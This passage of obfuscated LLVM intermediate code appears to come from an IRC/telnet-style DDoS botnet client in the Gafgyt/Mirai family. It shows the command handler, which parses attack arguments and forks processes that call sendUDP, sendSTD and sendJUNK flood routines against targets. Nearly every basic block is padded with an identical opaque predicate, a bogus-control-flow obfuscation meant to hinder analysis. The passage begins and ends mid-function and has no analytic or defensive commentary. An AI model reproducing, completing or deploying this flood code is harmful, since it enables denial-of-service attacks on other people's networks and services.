  %399 = load i8*, i8** %14, align 8
  %400 = icmp ne i8* %399, null
  br i1 %400, label %401, label %428

; <label>:401:                                    ; preds = %398
  %402 = call i32 @listFork()
  %403 = icmp ne i32 %402, 0
  br i1 %403, label %410, label %404

; <label>:404:                                    ; preds = %401
  %405 = load i8*, i8** %14, align 8
  %406 = load i32, i32* %12, align 4
  %407 = load i32, i32* %13, align 4
  call void @sendJUNK(i8* %405, i32 %406, i32 %407)
  %408 = load i32, i32* @mainCommSock, align 4
  %409 = call i32 @close(i32 %408)
  call void @_exit(i32 0) #12
  unreachable

; <label>:410:                                    ; preds = %401
  %411 = load i32, i32* @x.79
  %412 = load i32, i32* @y.80
  %413 = sub i32 %411, 1
  %414 = mul i32 %411, %413
  %415 = urem i32 %414, 2
  %416 = icmp eq i32 %415, 0
  %417 = icmp slt i32 %412, 10
  %418 = or i1 %416, %417
  br i1 %418, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %410
  %419 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %419, i8** %14, align 8
  %420 = load i32, i32* @x.79
  %421 = load i32, i32* @y.80
  %422 = sub i32 %420, 1
  %423 = mul i32 %420, %422
  %424 = urem i32 %423, 2
  %425 = icmp eq i32 %424, 0
  %426 = icmp slt i32 %421, 10
  %427 = or i1 %425, %426
  br i1 %427, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %398

; <label>:428:                                    ; preds = %398
  br label %485

; <label>:429:                                    ; preds = %originalBBpart240
  %430 = load i32, i32* @x.79
  %431 = load i32, i32* @y.80
  %432 = sub i32 %430, 1
  %433 = mul i32 %430, %432
  %434 = urem i32 %433, 2
  %435 = icmp eq i32 %434, 0
  %436 = icmp slt i32 %431, 10
  %437 = or i1 %435, %436
  br i1 %437, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %429
  %438 = call i32 @listFork()
  %439 = icmp ne i32 %438, 0
  %440 = load i32, i32* @x.79
  %441 = load i32, i32* @y.80
  %442 = sub i32 %440, 1
  %443 = mul i32 %440, %442
  %444 = urem i32 %443, 2
  %445 = icmp eq i32 %444, 0
  %446 = icmp slt i32 %441, 10
  %447 = or i1 %445, %446
  br i1 %447, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %439, label %448, label %465

; <label>:448:                                    ; preds = %originalBBpart248
  %449 = load i32, i32* @x.79
  %450 = load i32, i32* @y.80
  %451 = sub i32 %449, 1
  %452 = mul i32 %449, %451
  %453 = urem i32 %452, 2
  %454 = icmp eq i32 %453, 0
  %455 = icmp slt i32 %450, 10
  %456 = or i1 %454, %455
  br i1 %456, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %448
  %457 = load i32, i32* @x.79
  %458 = load i32, i32* @y.80
  %459 = sub i32 %457, 1
  %460 = mul i32 %457, %459
  %461 = urem i32 %460, 2
  %462 = icmp eq i32 %461, 0
  %463 = icmp slt i32 %458, 10
  %464 = or i1 %462, %463
  br i1 %464, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br label %1855

; <label>:465:                                    ; preds = %originalBBpart248
  %466 = load i32, i32* @x.79
  %467 = load i32, i32* @y.80
  %468 = sub i32 %466, 1
  %469 = mul i32 %466, %468
  %470 = urem i32 %469, 2
  %471 = icmp eq i32 %470, 0
  %472 = icmp slt i32 %467, 10
  %473 = or i1 %471, %472
  br i1 %473, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %465
  %474 = load i8*, i8** %11, align 8
  %475 = load i32, i32* %12, align 4
  %476 = load i32, i32* %13, align 4
  call void @sendJUNK(i8* %474, i32 %475, i32 %476)
  call void @_exit(i32 0) #12
  %477 = load i32, i32* @x.79
  %478 = load i32, i32* @y.80
  %479 = sub i32 %477, 1
  %480 = mul i32 %477, %479
  %481 = urem i32 %480, 2
  %482 = icmp eq i32 %481, 0
  %483 = icmp slt i32 %478, 10
  %484 = or i1 %482, %483
  br i1 %484, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  unreachable

; <label>:485:                                    ; preds = %428
  br label %486

; <label>:486:                                    ; preds = %485, %326
  %487 = load i32, i32* @x.79
  %488 = load i32, i32* @y.80
  %489 = sub i32 %487, 1
  %490 = mul i32 %487, %489
  %491 = urem i32 %490, 2
  %492 = icmp eq i32 %491, 0
  %493 = icmp slt i32 %488, 10
  %494 = or i1 %492, %493
  br i1 %494, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %486
  %495 = load i8**, i8*** %4, align 8
  %496 = getelementptr inbounds i8*, i8** %495, i64 0
  %497 = load i8*, i8** %496, align 8
  %498 = call i32 @strcmp(i8* %497, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.78, i32 0, i32 0)) #10
  %499 = icmp ne i32 %498, 0
  %500 = load i32, i32* @x.79
  %501 = load i32, i32* @y.80
  %502 = sub i32 %500, 1
  %503 = mul i32 %500, %502
  %504 = urem i32 %503, 2
  %505 = icmp eq i32 %504, 0
  %506 = icmp slt i32 %501, 10
  %507 = or i1 %505, %506
  br i1 %507, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br i1 %499, label %765, label %508

; <label>:508:                                    ; preds = %originalBBpart260
  %509 = load i32, i32* %3, align 4
  %510 = icmp slt i32 %509, 6
  br i1 %510, label %620, label %511

; <label>:511:                                    ; preds = %508
  %512 = load i32, i32* @x.79
  %513 = load i32, i32* @y.80
  %514 = sub i32 %512, 1
  %515 = mul i32 %512, %514
  %516 = urem i32 %515, 2
  %517 = icmp eq i32 %516, 0
  %518 = icmp slt i32 %513, 10
  %519 = or i1 %517, %518
  br i1 %519, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %511
  %520 = load i8**, i8*** %4, align 8
  %521 = getelementptr inbounds i8*, i8** %520, i64 3
  %522 = load i8*, i8** %521, align 8
  %523 = call i32 @atoi(i8* %522) #10
  %524 = icmp eq i32 %523, -1
  %525 = load i32, i32* @x.79
  %526 = load i32, i32* @y.80
  %527 = sub i32 %525, 1
  %528 = mul i32 %525, %527
  %529 = urem i32 %528, 2
  %530 = icmp eq i32 %529, 0
  %531 = icmp slt i32 %526, 10
  %532 = or i1 %530, %531
  br i1 %532, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %524, label %620, label %533

; <label>:533:                                    ; preds = %originalBBpart264
  %534 = load i8**, i8*** %4, align 8
  %535 = getelementptr inbounds i8*, i8** %534, i64 2
  %536 = load i8*, i8** %535, align 8
  %537 = call i32 @atoi(i8* %536) #10
  %538 = icmp eq i32 %537, -1
  br i1 %538, label %620, label %539

; <label>:539:                                    ; preds = %533
  %540 = load i32, i32* @x.79
  %541 = load i32, i32* @y.80
  %542 = sub i32 %540, 1
  %543 = mul i32 %540, %542
  %544 = urem i32 %543, 2
  %545 = icmp eq i32 %544, 0
  %546 = icmp slt i32 %541, 10
  %547 = or i1 %545, %546
  br i1 %547, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %539
  %548 = load i8**, i8*** %4, align 8
  %549 = getelementptr inbounds i8*, i8** %548, i64 4
  %550 = load i8*, i8** %549, align 8
  %551 = call i32 @atoi(i8* %550) #10
  %552 = icmp eq i32 %551, -1
  %553 = load i32, i32* @x.79
  %554 = load i32, i32* @y.80
  %555 = sub i32 %553, 1
  %556 = mul i32 %553, %555
  %557 = urem i32 %556, 2
  %558 = icmp eq i32 %557, 0
  %559 = icmp slt i32 %554, 10
  %560 = or i1 %558, %559
  br i1 %560, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %552, label %620, label %561

; <label>:561:                                    ; preds = %originalBBpart268
  %562 = load i8**, i8*** %4, align 8
  %563 = getelementptr inbounds i8*, i8** %562, i64 5
  %564 = load i8*, i8** %563, align 8
  %565 = call i32 @atoi(i8* %564) #10
  %566 = icmp eq i32 %565, -1
  br i1 %566, label %620, label %567

; <label>:567:                                    ; preds = %561
  %568 = load i32, i32* @x.79
  %569 = load i32, i32* @y.80
  %570 = sub i32 %568, 1
  %571 = mul i32 %568, %570
  %572 = urem i32 %571, 2
  %573 = icmp eq i32 %572, 0
  %574 = icmp slt i32 %569, 10
  %575 = or i1 %573, %574
  br i1 %575, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %567
  %576 = load i8**, i8*** %4, align 8
  %577 = getelementptr inbounds i8*, i8** %576, i64 5
  %578 = load i8*, i8** %577, align 8
  %579 = call i32 @atoi(i8* %578) #10
  %580 = icmp sgt i32 %579, 65500
  %581 = load i32, i32* @x.79
  %582 = load i32, i32* @y.80
  %583 = sub i32 %581, 1
  %584 = mul i32 %581, %583
  %585 = urem i32 %584, 2
  %586 = icmp eq i32 %585, 0
  %587 = icmp slt i32 %582, 10
  %588 = or i1 %586, %587
  br i1 %588, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br i1 %580, label %620, label %589

; <label>:589:                                    ; preds = %originalBBpart272
  %590 = load i8**, i8*** %4, align 8
  %591 = getelementptr inbounds i8*, i8** %590, i64 4
  %592 = load i8*, i8** %591, align 8
  %593 = call i32 @atoi(i8* %592) #10
  %594 = icmp sgt i32 %593, 32
  br i1 %594, label %620, label %595

; <label>:595:                                    ; preds = %589
  %596 = load i32, i32* @x.79
  %597 = load i32, i32* @y.80
  %598 = sub i32 %596, 1
  %599 = mul i32 %596, %598
  %600 = urem i32 %599, 2
  %601 = icmp eq i32 %600, 0
  %602 = icmp slt i32 %597, 10
  %603 = or i1 %601, %602
  br i1 %603, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %595
  %604 = load i32, i32* %3, align 4
  %605 = icmp eq i32 %604, 7
  %606 = load i32, i32* @x.79
  %607 = load i32, i32* @y.80
  %608 = sub i32 %606, 1
  %609 = mul i32 %606, %608
  %610 = urem i32 %609, 2
  %611 = icmp eq i32 %610, 0
  %612 = icmp slt i32 %607, 10
  %613 = or i1 %611, %612
  br i1 %613, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %605, label %614, label %621

; <label>:614:                                    ; preds = %originalBBpart276
  %615 = load i8**, i8*** %4, align 8
  %616 = getelementptr inbounds i8*, i8** %615, i64 6
  %617 = load i8*, i8** %616, align 8
  %618 = call i32 @atoi(i8* %617) #10
  %619 = icmp slt i32 %618, 1
  br i1 %619, label %620, label %621

; <label>:620:                                    ; preds = %614, %589, %originalBBpart272, %561, %originalBBpart268, %533, %originalBBpart264, %508
  br label %1855

; <label>:621:                                    ; preds = %614, %originalBBpart276
  %622 = load i32, i32* @x.79
  %623 = load i32, i32* @y.80
  %624 = sub i32 %622, 1
  %625 = mul i32 %622, %624
  %626 = urem i32 %625, 2
  %627 = icmp eq i32 %626, 0
  %628 = icmp slt i32 %623, 10
  %629 = or i1 %627, %628
  br i1 %629, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %621
  %630 = load i8**, i8*** %4, align 8
  %631 = getelementptr inbounds i8*, i8** %630, i64 1
  %632 = load i8*, i8** %631, align 8
  store i8* %632, i8** %15, align 8
  %633 = load i8**, i8*** %4, align 8
  %634 = getelementptr inbounds i8*, i8** %633, i64 2
  %635 = load i8*, i8** %634, align 8
  %636 = call i32 @atoi(i8* %635) #10
  store i32 %636, i32* %16, align 4
  %637 = load i8**, i8*** %4, align 8
  %638 = getelementptr inbounds i8*, i8** %637, i64 3
  %639 = load i8*, i8** %638, align 8
  %640 = call i32 @atoi(i8* %639) #10
  store i32 %640, i32* %17, align 4
  %641 = load i8**, i8*** %4, align 8
  %642 = getelementptr inbounds i8*, i8** %641, i64 4
  %643 = load i8*, i8** %642, align 8
  %644 = call i32 @atoi(i8* %643) #10
  store i32 %644, i32* %18, align 4
  %645 = load i8**, i8*** %4, align 8
  %646 = getelementptr inbounds i8*, i8** %645, i64 5
  %647 = load i8*, i8** %646, align 8
  %648 = call i32 @atoi(i8* %647) #10
  store i32 %648, i32* %19, align 4
  %649 = load i32, i32* %3, align 4
  %650 = icmp eq i32 %649, 7
  %651 = load i32, i32* @x.79
  %652 = load i32, i32* @y.80
  %653 = sub i32 %651, 1
  %654 = mul i32 %651, %653
  %655 = urem i32 %654, 2
  %656 = icmp eq i32 %655, 0
  %657 = icmp slt i32 %652, 10
  %658 = or i1 %656, %657
  br i1 %658, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br i1 %650, label %659, label %680

; <label>:659:                                    ; preds = %originalBBpart280
  %660 = load i32, i32* @x.79
  %661 = load i32, i32* @y.80
  %662 = sub i32 %660, 1
  %663 = mul i32 %660, %662
  %664 = urem i32 %663, 2
  %665 = icmp eq i32 %664, 0
  %666 = icmp slt i32 %661, 10
  %667 = or i1 %665, %666
  br i1 %667, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %659
  %668 = load i8**, i8*** %4, align 8
  %669 = getelementptr inbounds i8*, i8** %668, i64 6
  %670 = load i8*, i8** %669, align 8
  %671 = call i32 @atoi(i8* %670) #10
  %672 = load i32, i32* @x.79
  %673 = load i32, i32* @y.80
  %674 = sub i32 %672, 1
  %675 = mul i32 %672, %674
  %676 = urem i32 %675, 2
  %677 = icmp eq i32 %676, 0
  %678 = icmp slt i32 %673, 10
  %679 = or i1 %677, %678
  br i1 %679, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br label %681

; <label>:680:                                    ; preds = %originalBBpart280
  br label %681

; <label>:681:                                    ; preds = %680, %originalBBpart284
  %682 = phi i32 [ %671, %originalBBpart284 ], [ 10, %680 ]
  %683 = load i32, i32* @x.79
  %684 = load i32, i32* @y.80
  %685 = sub i32 %683, 1
  %686 = mul i32 %683, %685
  %687 = urem i32 %686, 2
  %688 = icmp eq i32 %687, 0
  %689 = icmp slt i32 %684, 10
  %690 = or i1 %688, %689
  br i1 %690, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %681
  store i32 %682, i32* %20, align 4
  %691 = load i8*, i8** %15, align 8
  %692 = call i8* @strstr(i8* %691, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #10
  %693 = icmp ne i8* %692, null
  %694 = load i32, i32* @x.79
  %695 = load i32, i32* @y.80
  %696 = sub i32 %694, 1
  %697 = mul i32 %694, %696
  %698 = urem i32 %697, 2
  %699 = icmp eq i32 %698, 0
  %700 = icmp slt i32 %695, 10
  %701 = or i1 %699, %700
  br i1 %701, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br i1 %693, label %702, label %753

; <label>:702:                                    ; preds = %originalBBpart288
  %703 = load i8*, i8** %15, align 8
  %704 = call i8* @strtok(i8* %703, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %704, i8** %21, align 8
  br label %705

; <label>:705:                                    ; preds = %734, %702
  %706 = load i8*, i8** %21, align 8
  %707 = icmp ne i8* %706, null
  br i1 %707, label %708, label %736

; <label>:708:                                    ; preds = %705
  %709 = load i32, i32* @x.79
  %710 = load i32, i32* @y.80
  %711 = sub i32 %709, 1
  %712 = mul i32 %709, %711
  %713 = urem i32 %712, 2
  %714 = icmp eq i32 %713, 0
  %715 = icmp slt i32 %710, 10
  %716 = or i1 %714, %715
  br i1 %716, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %708
  %717 = call i32 @listFork()
  %718 = icmp ne i32 %717, 0
  %719 = load i32, i32* @x.79
  %720 = load i32, i32* @y.80
  %721 = sub i32 %719, 1
  %722 = mul i32 %719, %721
  %723 = urem i32 %722, 2
  %724 = icmp eq i32 %723, 0
  %725 = icmp slt i32 %720, 10
  %726 = or i1 %724, %725
  br i1 %726, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br i1 %718, label %734, label %727

; <label>:727:                                    ; preds = %originalBBpart292
  %728 = load i8*, i8** %21, align 8
  %729 = load i32, i32* %16, align 4
  %730 = load i32, i32* %17, align 4
  %731 = load i32, i32* %18, align 4
  %732 = load i32, i32* %19, align 4
  %733 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %728, i32 %729, i32 %730, i32 %731, i32 %732, i32 %733)
  call void @_exit(i32 0) #12
  unreachable

; <label>:734:                                    ; preds = %originalBBpart292
  %735 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %735, i8** %21, align 8
  br label %705

; <label>:736:                                    ; preds = %705
  %737 = load i32, i32* @x.79
  %738 = load i32, i32* @y.80
  %739 = sub i32 %737, 1
  %740 = mul i32 %737, %739
  %741 = urem i32 %740, 2
  %742 = icmp eq i32 %741, 0
  %743 = icmp slt i32 %738, 10
  %744 = or i1 %742, %743
  br i1 %744, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %736
  %745 = load i32, i32* @x.79
  %746 = load i32, i32* @y.80
  %747 = sub i32 %745, 1
  %748 = mul i32 %745, %747
  %749 = urem i32 %748, 2
  %750 = icmp eq i32 %749, 0
  %751 = icmp slt i32 %746, 10
  %752 = or i1 %750, %751
  br i1 %752, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br label %764

; <label>:753:                                    ; preds = %originalBBpart288
  %754 = call i32 @listFork()
  %755 = icmp ne i32 %754, 0
  br i1 %755, label %756, label %757

; <label>:756:                                    ; preds = %753
  br label %1855

; <label>:757:                                    ; preds = %753
  %758 = load i8*, i8** %15, align 8
  %759 = load i32, i32* %16, align 4
  %760 = load i32, i32* %17, align 4
  %761 = load i32, i32* %18, align 4
  %762 = load i32, i32* %19, align 4
  %763 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %758, i32 %759, i32 %760, i32 %761, i32 %762, i32 %763)
  call void @_exit(i32 0) #12
  unreachable

; <label>:764:                                    ; preds = %originalBBpart296
  br label %765

; <label>:765:                                    ; preds = %764, %originalBBpart260
  %766 = load i8**, i8*** %4, align 8
  %767 = getelementptr inbounds i8*, i8** %766, i64 0
  %768 = load i8*, i8** %767, align 8
  %769 = call i32 @strcmp(i8* %768, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.79, i32 0, i32 0)) #10
  %770 = icmp ne i32 %769, 0
  br i1 %770, label %907, label %771

; <label>:771:                                    ; preds = %765
  %772 = load i32, i32* %3, align 4
  %773 = icmp slt i32 %772, 4
  br i1 %773, label %802, label %774

; <label>:774:                                    ; preds = %771
  %775 = load i32, i32* @x.79
  %776 = load i32, i32* @y.80
  %777 = sub i32 %775, 1
  %778 = mul i32 %775, %777
  %779 = urem i32 %778, 2
  %780 = icmp eq i32 %779, 0
  %781 = icmp slt i32 %776, 10
  %782 = or i1 %780, %781
  br i1 %782, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %774
  %783 = load i8**, i8*** %4, align 8
  %784 = getelementptr inbounds i8*, i8** %783, i64 2
  %785 = load i8*, i8** %784, align 8
  %786 = call i32 @atoi(i8* %785) #10
  %787 = icmp slt i32 %786, 1
  %788 = load i32, i32* @x.79
  %789 = load i32, i32* @y.80
  %790 = sub i32 %788, 1
  %791 = mul i32 %788, %790
  %792 = urem i32 %791, 2
  %793 = icmp eq i32 %792, 0
  %794 = icmp slt i32 %789, 10
  %795 = or i1 %793, %794
  br i1 %795, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br i1 %787, label %802, label %796

; <label>:796:                                    ; preds = %originalBBpart2100
  %797 = load i8**, i8*** %4, align 8
  %798 = getelementptr inbounds i8*, i8** %797, i64 3
  %799 = load i8*, i8** %798, align 8
  %800 = call i32 @atoi(i8* %799) #10
  %801 = icmp slt i32 %800, 1
  br i1 %801, label %802, label %819

; <label>:802:                                    ; preds = %796, %originalBBpart2100, %771
  %803 = load i32, i32* @x.79
  %804 = load i32, i32* @y.80
  %805 = sub i32 %803, 1
  %806 = mul i32 %803, %805
  %807 = urem i32 %806, 2
  %808 = icmp eq i32 %807, 0
  %809 = icmp slt i32 %804, 10
  %810 = or i1 %808, %809
  br i1 %810, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %802
  %811 = load i32, i32* @x.79
  %812 = load i32, i32* @y.80
  %813 = sub i32 %811, 1
  %814 = mul i32 %811, %813
  %815 = urem i32 %814, 2
  %816 = icmp eq i32 %815, 0
  %817 = icmp slt i32 %812, 10
  %818 = or i1 %816, %817
  br i1 %818, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br label %1855

; <label>:819:                                    ; preds = %796
  %820 = load i8**, i8*** %4, align 8
  %821 = getelementptr inbounds i8*, i8** %820, i64 1
  %822 = load i8*, i8** %821, align 8
  store i8* %822, i8** %22, align 8
  %823 = load i8**, i8*** %4, align 8
  %824 = getelementptr inbounds i8*, i8** %823, i64 2
  %825 = load i8*, i8** %824, align 8
  %826 = call i32 @atoi(i8* %825) #10
  store i32 %826, i32* %23, align 4
  %827 = load i8**, i8*** %4, align 8
  %828 = getelementptr inbounds i8*, i8** %827, i64 3
  %829 = load i8*, i8** %828, align 8
  %830 = call i32 @atoi(i8* %829) #10
  store i32 %830, i32* %24, align 4
  %831 = load i8*, i8** %22, align 8
  %832 = call i8* @strstr(i8* %831, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #10
  %833 = icmp ne i8* %832, null
  br i1 %833, label %834, label %866

; <label>:834:                                    ; preds = %819
  %835 = load i8*, i8** %22, align 8
  %836 = call i8* @strtok(i8* %835, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %836, i8** %25, align 8
  br label %837

; <label>:837:                                    ; preds = %863, %834
  %838 = load i8*, i8** %25, align 8
  %839 = icmp ne i8* %838, null
  br i1 %839, label %840, label %865

; <label>:840:                                    ; preds = %837
  %841 = call i32 @listFork()
  %842 = icmp ne i32 %841, 0
  br i1 %842, label %863, label %843

; <label>:843:                                    ; preds = %840
  %844 = load i32, i32* @x.79
  %845 = load i32, i32* @y.80
  %846 = sub i32 %844, 1
  %847 = mul i32 %844, %846
  %848 = urem i32 %847, 2
  %849 = icmp eq i32 %848, 0
  %850 = icmp slt i32 %845, 10
  %851 = or i1 %849, %850
  br i1 %851, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %843
  %852 = load i8*, i8** %25, align 8
  %853 = load i32, i32* %23, align 4
  %854 = load i32, i32* %24, align 4
  call void @sendSTD(i8* %852, i32 %853, i32 %854)
  call void @_exit(i32 0) #12
  %855 = load i32, i32* @x.79
  %856 = load i32, i32* @y.80
  %857 = sub i32 %855, 1
  %858 = mul i32 %855, %857
  %859 = urem i32 %858, 2
  %860 = icmp eq i32 %859, 0
  %861 = icmp slt i32 %856, 10
  %862 = or i1 %860, %861
  br i1 %862, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  unreachable

; <label>:863:                                    ; preds = %840
  %864 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %864, i8** %25, align 8
  br label %837

; <label>:865:                                    ; preds = %837
  br label %890

; <label>:866:                                    ; preds = %819
  %867 = call i32 @listFork()
  %868 = icmp ne i32 %867, 0
  br i1 %868, label %869, label %886

; <label>:869:                                    ; preds = %866
  %870 = load i32, i32* @x.79
  %871 = load i32, i32* @y.80
  %872 = sub i32 %870, 1
  %873 = mul i32 %870, %872
  %874 = urem i32 %873, 2
  %875 = icmp eq i32 %874, 0
  %876 = icmp slt i32 %871, 10
  %877 = or i1 %875, %876
  br i1 %877, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %869
  %878 = load i32, i32* @x.79
  %879 = load i32, i32* @y.80
  %880 = sub i32 %878, 1
  %881 = mul i32 %878, %880
  %882 = urem i32 %881, 2
  %883 = icmp eq i32 %882, 0
  %884 = icmp slt i32 %879, 10
  %885 = or i1 %883, %884
  br i1 %885, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br label %1855

; <label>:886:                                    ; preds = %866
  %887 = load i8*, i8** %22, align 8
  %888 = load i32, i32* %23, align 4
  %889 = load i32, i32* %24, align 4
  call void @sendSTD(i8* %887, i32 %888, i32 %889)
  call void @_exit(i32 0) #12
  unreachable

; <label>:890:                                    ; preds = %865
  %891 = load i32, i32* @x.79
  %892 = load i32, i32* @y.80
  %893 = sub i32 %891, 1
  %894 = mul i32 %891, %893
  %895 = urem i32 %894, 2
  %896 = icmp eq i32 %895, 0
  %897 = icmp slt i32 %892, 10
  %898 = or i1 %896, %897
  br i1 %898, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %890
  %899 = load i32, i32* @x.79
  %900 = load i32, i32* @y.80
  %901 = sub i32 %899, 1
  %902 = mul i32 %899, %901
  %903 = urem i32 %902, 2
  %904 = icmp eq i32 %903, 0
  %905 = icmp slt i32 %900, 10
  %906 = or i1 %904, %905
  br i1 %906, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br label %907

; <label>:907:                                    ; preds = %originalBBpart2116, %765
  %908 = load i32, i32* @x.79
  %909 = load i32, i32* @y.80
  %910 = sub i32 %908, 1
  %911 = mul i32 %908, %910
  %912 = urem i32 %911, 2
  %913 = icmp eq i32 %912, 0
  %914 = icmp slt i32 %909, 10
  %915 = or i1 %913, %914
  br i1 %915, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %907
  %916 = load i8**, i8*** %4, align 8
  %917 = getelementptr inbounds i8*, i8** %916, i64 0
  %918 = load i8*, i8** %917, align 8
  %919 = call i32 @strcmp(i8* %918, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.80, i32 0, i32 0)) #10
  %920 = icmp ne i32 %919, 0
  %921 = load i32, i32* @x.79
  %922 = load i32, i32* @y.80
  %923 = sub i32 %921, 1
  %924 = mul i32 %921, %923
  %925 = urem i32 %924, 2
  %926 = icmp eq i32 %925, 0
  %927 = icmp slt i32 %922, 10
  %928 = or i1 %926, %927
  br i1 %928, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br i1 %920, label %1119, label %929

; <label>:929:                                    ; preds = %originalBBpart2120
  %930 = load i32, i32* @x.79
  %931 = load i32, i32* @y.80
  %932 = sub i32 %930, 1
  %933 = mul i32 %930, %932
  %934 = urem i32 %933, 2
  %935 = icmp eq i32 %934, 0
  %936 = icmp slt i32 %931, 10
  %937 = or i1 %935, %936
  br i1 %937, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %929
  %938 = load i32, i32* %3, align 4
  %939 = icmp slt i32 %938, 3
  %940 = load i32, i32* @x.79
  %941 = load i32, i32* @y.80
  %942 = sub i32 %940, 1
  %943 = mul i32 %940, %942
  %944 = urem i32 %943, 2
  %945 = icmp eq i32 %944, 0
  %946 = icmp slt i32 %941, 10
  %947 = or i1 %945, %946
  br i1 %947, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br i1 %939, label %954, label %948

; <label>:948:                                    ; preds = %originalBBpart2124
  %949 = load i8**, i8*** %4, align 8
  %950 = getelementptr inbounds i8*, i8** %949, i64 2
  %951 = load i8*, i8** %950, align 8
  %952 = call i32 @atoi(i8* %951) #10
  %953 = icmp slt i32 %952, 1
  br i1 %953, label %954, label %971

; <label>:954:                                    ; preds = %948, %originalBBpart2124
  %955 = load i32, i32* @x.79
  %956 = load i32, i32* @y.80
  %957 = sub i32 %955, 1
  %958 = mul i32 %955, %957
  %959 = urem i32 %958, 2
  %960 = icmp eq i32 %959, 0
  %961 = icmp slt i32 %956, 10
  %962 = or i1 %960, %961
  br i1 %962, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %954
  %963 = load i32, i32* @x.79
  %964 = load i32, i32* @y.80
  %965 = sub i32 %963, 1
  %966 = mul i32 %963, %965
  %967 = urem i32 %966, 2
  %968 = icmp eq i32 %967, 0
  %969 = icmp slt i32 %964, 10
  %970 = or i1 %968, %969
  br i1 %970, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br label %1855

; <label>:971:                                    ; preds = %948
  %972 = load i8**, i8*** %4, align 8
  %973 = getelementptr inbounds i8*, i8** %972, i64 1
  %974 = load i8*, i8** %973, align 8
  store i8* %974, i8** %26, align 8
  %975 = load i8**, i8*** %4, align 8
  %976 = getelementptr inbounds i8*, i8** %975, i64 2
  %977 = load i8*, i8** %976, align 8
  %978 = call i32 @atoi(i8* %977) #10
  store i32 %978, i32* %27, align 4
